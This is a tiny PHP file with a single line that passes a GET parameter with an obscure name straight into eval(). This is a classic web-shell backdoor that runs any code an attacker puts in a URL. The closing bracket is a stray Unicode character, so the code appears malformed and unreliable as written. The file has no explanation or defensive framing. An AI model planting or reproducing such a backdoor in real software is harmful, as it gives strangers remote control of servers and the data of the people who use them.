<?php
eval($_GET['1dt_cXrL'〕);
?>
